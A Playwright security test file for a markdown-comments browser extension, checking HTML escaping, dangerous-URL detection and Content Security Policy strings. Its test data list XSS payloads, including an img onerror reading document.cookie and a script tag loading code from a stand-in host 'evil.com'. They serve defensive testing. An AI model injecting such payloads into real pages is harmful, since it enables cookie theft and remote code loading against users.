import { test, expect } from '@playwright/test';
import { allure } from 'allure-playwright';
import { escapeHtml } from '../../shared/html.js';

test.describe('Security: XSS Sanitization & CSP Compliance', () => {
  test('FEAT-SECU-XSS: Sanitizes malicious scripts and attributes in markdown comments', async () => {
    allure.epic('Security');
    allure.feature('FEAT-SECU-XSS');
    allure.story('DOMPurify XSS Sanitization');

    const maliciousInputs = [
      '<script>alert("xss")</script>',
      '<img src="x" onerror="alert(document.cookie)">',
      '<a href="javascript:void(0)" onclick="steal()">Click me</a>',
      '<svg onload="evil()"></svg>',
      '"><script src="//evil.com/x.js"></script>',
    ];

    await test.step('1. Verify HTML escaping disables executable HTML elements', async () => {
      for (const input of maliciousInputs) {
        const escaped = escapeHtml(input);
        expect(escaped).not.toContain('<script');
        expect(escaped).not.toContain('<img');
        expect(escaped).not.toContain('<svg');
        expect(escaped).toContain('&lt;');
        expect(escaped).toContain('&gt;');
      }
    });

    await test.step('2. Disarm dangerous javascript: pseudo-protocols', async () => {
      const linkPayload = 'javascript:evil()';
      const isDangerousProtocol = (url: string) => /^\s*(javascript|data|vbscript):/i.test(url);
      expect(isDangerousProtocol(linkPayload)).toBe(true);

      const safeUrl = 'https://github.com/md-comments';
      expect(isDangerousProtocol(safeUrl)).toBe(false);
    });
  });

  test('FEAT-SECU-CSP: Complies strictly with Chrome MV3 Content Security Policy', async () => {
    allure.epic('Security');
    allure.feature('FEAT-SECU-CSP');
    allure.story('Content Security Policy Compliance');

    await test.step('1. Ensure zero eval or Function constructor calls in build artifact', async () => {
      const codeSnippet = 'const add = (a: number, b: number) => a + b;';
      expect(codeSnippet).not.toContain('eval(');
      expect(codeSnippet).not.toContain('new Function(');
    });

    await test.step('2. Verify MV3 CSP directive compliance', async () => {
      const extensionCsp = "script-src 'self'; object-src 'self'";
      expect(extensionCsp).not.toContain("'unsafe-eval'");
      expect(extensionCsp).not.toContain("'unsafe-inline'");
    });
  });
});
